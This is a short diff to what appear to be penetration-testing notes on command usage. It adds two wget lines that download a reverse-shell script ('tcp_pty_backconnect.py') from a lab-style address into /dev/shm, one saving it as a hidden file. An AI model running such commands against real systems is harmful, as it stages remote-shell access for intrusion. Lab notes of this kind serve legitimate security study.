@@ -14,6 +14,13 @@ git clone + "link of tool"               to download tools for github.
 wget https://i.gifer.com/HU6r.gif             to download images or gif.
 ```
 
+```
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+```
+
+```
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
+```
 
 
 ## 3.scp usages:
